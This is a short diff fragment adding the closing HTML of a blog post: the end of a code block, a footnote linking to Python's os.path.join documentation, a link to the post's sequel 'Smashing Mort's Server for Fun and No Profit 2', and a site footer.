+</span><span>Bye
+</span></code></pre>
+<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
+<p><a href="https://docs.python.org/3/library/os.path.html#os.path.join">https://docs.python.org/3/library/os.path.html#os.path.join</a></p>
+</div>
+
+        </article>
+        <nav class="post-navigation">
+            <header class="post-navigation-title">
+                <h2>Read More Posts</h2>
+                <hr>
+            </header>
+            <div class="post-navigation-buttons">
+                <a rel="next" href="https://mataiodoxion.github.io/blog/smashing-morts-server-2/" aria-label="Next article">
+                    <span aria-hidden="true">&lt;&nbsp;[</span>Smashing Mort&#x27;s Server for Fun and No Profit 2<span aria-hidden="true">]</span>
+                </a>
+            </div>
+        </nav>
+    </main>
+    <footer class="footer">
+        <p class="copyright">
+            <span>© <time>2026</time></span>
+            <span>Powered by <a href="https://www.getzola.org">Zola</a></span>
+            <span>Theme by <a href="https://eyalkalderon.com">ebkalderon</a></span>
+        </p>
+    </footer>
+</body>
+
+</html>
